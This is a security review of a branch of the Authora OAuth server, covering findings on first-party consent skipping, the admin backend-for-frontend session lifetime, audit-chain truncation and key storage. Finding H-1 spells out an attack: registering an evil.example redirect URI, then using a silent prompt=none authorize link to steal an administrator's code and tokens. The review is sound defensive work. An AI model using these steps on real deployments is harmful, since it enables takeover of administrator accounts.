# Authora – Differential Security Review

**Range:** `main..feature/implement-findings-and-tech-debt` (`7fdbe8d`, `0ed758f`, `be5b601`)
**Date:** 2026-10-14
**Scope:** 77 files, +6134 / −371 (64 source files, +4767 / −280; the rest are docs and migrations)

---

## Fix Status (2026-10-14, after review)

| Finding | Status | Change |
|---------|--------|--------|
| H-1 | ✅ Fixed | `AddRedirectUriService` and `AllowScopeService` throw `ConflictException` (409) for first-party Clients. Changing them needs `clients.manage-first-party` to mark them as third-party first. Test: `FirstPartyClient_WithOnlyUpdatePermission_GetsNoRedirectUriOrScope`. |
| M-1 | ✅ Fixed | The admin cookie is bound to the Authora Session (`AdminUiTokens.SessionId`). The callback requires a valid Session, and refresh requires the same, still-valid Session (lifetime counted from the password, idle timeout, sign-out elsewhere, disabled User). If not, refresh revokes the Grant and returns 401. Tests: `Callback_WithoutSession_DoesNotRedeemTheCode`, `Refresh_AfterTheSessionEnded_…`, `Refresh_WithAnotherSession_IsUnauthorized`. |
| L-1 | ✅ Mitigated | Before cutting the chain, the cleanup records `system.audit-chain-truncated` (target: the new first Sequence) and logs event 8004. Verification fails if the chain starts after Sequence 1 without such a record. Remaining risk: a database writer can insert a matching record with a current time, which then gets sealed. The docs say to compare these records with the logged events 8004. Test: `StartDeletedInTheDatabase_BreaksTheChain`. |
| L-2 | ✅ Fixed (TD-015 resolved) | `Authora:DataProtection:CertificatePath`/`CertificatePassword` encrypt the keys at rest (`ProtectKeysWithCertificate`), checked at startup. Tests: `DataProtection_RejectsUnusableCertificate`, `DataProtection_WithCertificate_EncryptsTheKeysAtRest`. |
| I-1, I-2 | Not changed | Informational: I-1 is the intended reuse detection, and I-2 has no effect. |

Build: 0 warnings. Tests: 264/264 passed.

---

## 1. Executive Summary

| Severity | Count |
|----------|-------|
| 🔴 CRITICAL | 0 |
| 🟠 HIGH | 1 |
| 🟡 MEDIUM | 1 |
| 🟢 LOW | 2 |
| ℹ️ INFO | 2 |

**Overall Risk:** HIGH (one privilege escalation for insiders who already have some admin rights)
**Recommendation:** CONDITIONAL. Merge once H-1 is fixed. M-1 should be fixed or its documentation corrected.

**Key metrics**
- HIGH-risk files analyzed: 100% (BFF, authorize page, token issuance, grant, first-party, forwarded headers, audit chain, cleanup, Program wiring)
- Security regressions detected: 1 (H-1: the consent step for the admin Client was removed while its Redirect URIs stay editable)
- Test coverage of the new code: good (40+ new integration tests). The gaps are listed in §4.

Overall the branch is well built. The BFF compares `state` in fixed time, checks `iss` (RFC 9207), uses a single-use time-limited sign-in cookie, an allow-listed `returnTo`, `__Host-` cookies, a custom header plus Fetch Metadata plus `SameSite=Strict`, and keeps the code verifier only on the server. Grant lifetime is enforced everywhere: issue, refresh, introspection and access-token validation. The forwarded-headers breadth check handles IPv4-mapped IPv6 correctly.

---

## 2. What Changed

| Area | Files | Risk |
|------|-------|------|
| Admin UI backend for frontend (TD-014) | `Api/AdminUi/*`, `AdminUiController.cs`, `Program.cs`, `wwwroot/admin/js/*` | HIGH |
| First-party Clients / consent skip (TD-012) | `Client.cs`, `SetFirstPartyService.cs`, `ValidatedAuthorizationRequest.cs`, `Authorize.cshtml.cs`, `ClientsController.cs`, `IdentitySeeder.cs` | HIGH |
| Absolute Grant lifetime | `Grant.cs`, `TokenIssuer.cs`, `IssueTokenService.cs`, `AccessTokenValidator.cs`, `IntrospectTokenService.cs`, `OAuthOptions*.cs` | HIGH |
| Audit hash chain (TD-013) | `AuditChain*`, `VerifyAuditChainService.cs`, `ExpiredDataCleaner.cs`, `AuditEventsController.cs` | MEDIUM |
| Forwarded headers / production check | `ForwardedHeadersSettings.cs`, `ProductionSettingsCheck.cs` | MEDIUM |
| Migrations, docs, tests | – | LOW |

---

## 3. Findings

### 🟠 H-1: `clients.update` alone gets a zero-click takeover of any administrator through the first-party Admin UI Client

**Files:**
- `src/Authora.Infrastructure/Seeding/IdentitySeeder.cs` (`client.SetFirstParty(true)`, commit `7fdbe8d`)
- `src/Authora.Api/Pages/OAuth/Authorize.cshtml.cs` (consent skip and `prompt=none`, `7fdbe8d`)
- `src/Authora.Api/Controllers/ClientsController.cs:334-340` (`POST {id}/redirect-uris` needs only `clients.update`)
- `src/Authora.Core/Application/Clients/AddRedirectUri/AddRedirectUriService.cs` (no guard for first-party Clients)

**Blast radius:** every User who can sign in to Authora and holds admin Permissions.
**Test coverage:** NO. `FirstPartyClientTests.MarkFirstParty_WithOnlyUpdatePermission_IsForbidden` covers only the flag, not editing a Client that is already first-party.

**Description.** The seeded `Authora Admin UI` Client is now first-party, so `/oauth/authorize` issues a code without showing any page, even with `prompt=none`. Its Redirect URIs and allowed Scopes can still be changed by anyone with `clients.update`. That Permission does not include `clients.manage-first-party`. The doc comment on `PermissionNames.Clients.ManageFirstParty` assumes that combining *both* Permissions is the dangerous case, but the Admin UI Client is first-party from the start, so `clients.update` alone is enough. The Client is public: the attacker brings their own PKCE pair, and no secret is needed.

**Attack scenario** (insider with `admin` scope plus `clients.update`, e.g. a "client manager" Role):
1. `POST /api/clients/{adminUiClientId}/redirect-uris {"uri":"https://evil.example/cb"}`. This is audited, but nothing blocks it.
2. The attacker sends a higher-privileged administrator a link (or embeds a top-level navigation):
   `https://auth.example.com/oauth/authorize?response_type=code&client_id={adminUi}&redirect_uri=https://evil.example/cb&scope=authora.admin&state=x&code_challenge={attacker's S256}&code_challenge_method=S256&prompt=none`
3. The victim has an Authora Session, and the Client is first-party, so the code goes straight to `evil.example` with no page shown.
4. The attacker redeems the code at `/oauth/token` with their own `code_verifier` and gets an `authora.admin` Access Token and Refresh Token **with the victim's Permissions** (Grant lifetime: 90 days).

Before this branch, step 3 showed a consent page, so the victim had to click. That is weak protection, but it is not zero-click, and `prompt=none` always returned `consent_required`.

**Recommendation** (any of these, ideally the first two):
- Pin the Admin UI Client: refuse to add or remove Redirect URIs or allowed Scopes on the Client whose Redirect URI is `AdminUiOptions.GetRedirectUri(issuer)` (throw `ConflictException`), or have the seeder re-assert its exact Redirect URI set at every startup.
- Require `clients.manage-first-party` in addition to `clients.update` to change Redirect URIs or allowed Scopes **of a first-party Client** (check inside `AddRedirectUriService`, `AllowScope…`, `UpdateClientService`; or make `IsFirstParty` reset to `false` when the URI set changes).
- Optional: skip consent only when the redirect URI is same-origin with the Issuer, or always when the Client allows `authora.admin`.
- Add a test: a User with `clients.update` adds a Redirect URI to the Admin UI Client → 409, or a later authorize request shows consent.

---

### 🟡 M-1: The Admin UI refresh limit counts from the callback, not from the authentication, so it can reach about 2× SessionLifetime

**File:** `src/Authora.Api/Controllers/AdminUiController.cs` (`CompleteSignIn` sets `SignedInAt = now`, and `RefreshSession` compares it with `SessionLifetime`)
**Test coverage:** PARTIAL (`Refresh_AfterSessionLifetime_…` uses a fresh sign-in only)

**Description.** The code comments say refreshes are not continued "beyond the lifetime of a Session" and that "signing in again needs the password once the Session is gone". But `SignedInAt` is the time of the BFF callback. Because the Client is first-party, the callback happens silently for any User whose Session is still alive. A User who entered the password at T0 and opens the admin interface at T0 + 11h59m (default 12h lifetime) keeps refreshing until about T0 + 24h. At the maximum lifetime of 7 days, that is about 14 days. The idle timeout (`SessionIdleTimeout`) is also never applied to the admin interface, and `/account/logout` from another place (or Session revocation) does not end the admin Grant. Only the admin UI's own sign-out button revokes it.

**Recommendation.** Use the code's `AuthenticatedAt` (already stored on `AuthorizationCode`) as `SignedInAt`. Expose it on the internal token result, or request `openid` and read `auth_time` from the ID Token. Optionally also check during refresh that the Session the code was issued from is still active. If you keep the current behavior, fix the comments and `docs/admin.md`.

---

### 🟢 L-1: Cutting the start of the audit chain is not detected, even when the checkpoint falls in the deleted part

**File:** `src/Authora.Core/Application/Audit/Verify/VerifyAuditChainService.cs` (`MatchesCheckpointAsync`: `sequence < first.Sequence → null`)

**Description.** The first remaining link is trusted, and a checkpoint older than it is reported as inconclusive (`null`), not as a mismatch. Someone with write access to the database can delete links and events up to any point (e.g. to hide recent events from before a recent checkpoint plus everything older), and the verification reports `isIntact = true`. Retention-based cleanup legitimately deletes from the start, but the verifier cannot tell that cleanup from tampering.

**Recommendation.** Flag the chain when the first remaining link's event is clearly newer than `now − AuditRetention` (minus a grace period) while `first.Sequence > 1`. Or have `ExpiredDataCleaner` log a "chain truncated up to Sequence N" checkpoint, so a shipped log can confirm every truncation.

### 🟢 L-2: Data Protection keys are stored unencrypted, and `KeysPath` is not enforced outside Development

**File:** `src/Authora.Api/Program.cs` (`AddDataProtection().SetApplicationName("Authora")`, `PersistKeysToFileSystem`)

**Description.** The admin cookie now holds a Refresh Token with admin rights. Anyone who can read the key directory can decrypt any captured `__Host-authora_admin` cookie. The keys are not encrypted at rest (`ProtectKeysWith…`), and `ProductionSettingsCheck` does not require `KeysPath`. It is only on the checklist in `docs/operations.md`. Without it, several instances fail with each other's cookies, and container restarts sign everyone out. This is a reliability problem rather than a security one.

**Recommendation.** Document or support `ProtectKeysWithCertificate`, and consider a startup warning (not a failure) when `KeysPath` is unset outside Development.

### ℹ️ I-1: Refresh Token reuse can end the admin session (availability only)
Without Web Locks (`navigator.locks`), or when a refresh response's `Set-Cookie` is lost (network drop after the server rotated the token), the next refresh reuses the old Refresh Token. Reuse detection then revokes the Grant, and the User has to sign in again. This is the accepted behavior. The 10 s skip window only reduces it.

### ℹ️ I-2: `expires_in` can be 0
`TokenIssuer` truncates `accessTokenLifetime.TotalSeconds` to `int`. When less than 1 s of the Grant is left, the response says `expires_in: 0`. This is harmless. Rounding up, or rejecting the request with `invalid_grant` when under 1 s is left, would be cleaner.

---

## 4. Test Coverage Analysis

| Change | Covered | Gap |
|--------|---------|-----|
| BFF callback (state, iss, missing cookie, `returnTo`) | ✅ | – |
| Cookie / header / Fetch Metadata / tampering | ✅ | – |
| Refresh skip window, refresh after SessionLifetime, sign-out revocation | ✅ | Lifetime measured from authentication (M-1) |
| First-party consent skip, `prompt=none`, `prompt=consent`, Permission checks | ✅ | **Editing a first-party Client with `clients.update` (H-1)** |
| Grant lifetime: token caps, expired Grant rejected | ✅ | – |
| Audit chain: change, delete, insert, shorten, rebuild, cleanup | ✅ | Prefix truncation past a checkpoint (L-1) |
| ForwardedHeaders breadth check | ✅ (`SecurityHardeningTests`) | – |

---

## 5. Blast Radius

| Change | Reach | Priority |
|--------|-------|----------|
| `ValidatedAuthorizationRequest.RequiresConsent` | Every authorization request of every first-party Client | P0 (H-1) |
| `AdminUiTokenMiddleware` | Every `/api/*` request | P1. Verified: only acts on header `X-Authora-Admin: 1`, no `Authorization`, same-origin or no Fetch Metadata. `/api` has no CORS policy (`OAuthCorsPolicyProvider` covers only OAuth/OIDC endpoints). |
| `Grant.IsExpired` / `TokenIssuer.Issue(Grant…)` | All token issuance and validation paths (4 call sites) | P1. All paths checked. |
| `ExpiredDataCleaner.DeleteAuditEventsAsync` | Audit retention | P2 |

---

## 6. Historical Context

- `AdminUiController.GetSettings` (`/admin/settings`) and the browser-side token handling in `auth.js` (`sessionStorage`, client-side PKCE) were removed. The replacement is strictly stronger: tokens are no longer readable by scripts, and the verifier never reaches the browser. No security check was lost.
- The `credentials: 'omit'` comment ("admin API ignores cookies") was intentionally reversed. The middleware's preconditions now carry the CSRF guarantee that the old design got from ignoring cookies. Those preconditions are tested (`Cookie_WithoutAdminHeader_IsIgnored`, `Cookie_FromCrossSiteRequest_IsIgnored`).
- `ProductionSettingsCheck` now applies to every environment except Development and Testing. This closes a fail-open for environments named e.g. `Staging`.
- The consent policy "asked on every request" (US-era design) is relaxed for first-party Clients. This is the source of H-1.

---

## 7. Recommendations

### Immediate (blocking)
- [ ] H-1: Pin the Admin UI Client's Redirect URIs and Scopes, or require `clients.manage-first-party` to change them on first-party Clients, and add a test.

### Before production
- [ ] M-1: Bound admin UI refreshes by the authentication time (`AuthenticatedAt`), not by the callback time, or correct the documentation.
- [ ] L-2: Document key-ring encryption at rest, and warn when `Authora:DataProtection:KeysPath` is unset.

### Technical debt
- [ ] L-1: Make chain truncation verifiable (log a checkpoint when truncating, or a plausibility check against the retention).
- [ ] I-2: Handle `expires_in` when less than 1 s is left.

---

## 8. Analysis Methodology

**Strategy:** FOCUSED (77 files: medium size, but the HIGH-risk auth changes were reviewed in depth)

- HIGH-risk files: 100% read in diff form, plus 1-hop dependencies (CORS policy provider, sign-out service, `AddRedirectUriService`, `ClientsController` Permission map, chain repository).
- Migrations: the three new migrations were checked for intent only. The Designer and snapshot files were not reviewed line by line.
- Docs: checked for whether they agree with the code where relevant (`operations.md`, Permission doc comments).
- No dynamic testing was done. Findings come from reading the code. H-1 was traced end to end through the controller, service, authorize page and token endpoint.

**Limitations:** No review of the external dependencies (ASP.NET Data Protection, EF Core). The admin JS views other than `clients.js` were not reviewed. Race conditions in the sealer were analyzed under the advisory lock, not tested.

**Confidence:** HIGH for H-1 and M-1. MEDIUM overall.
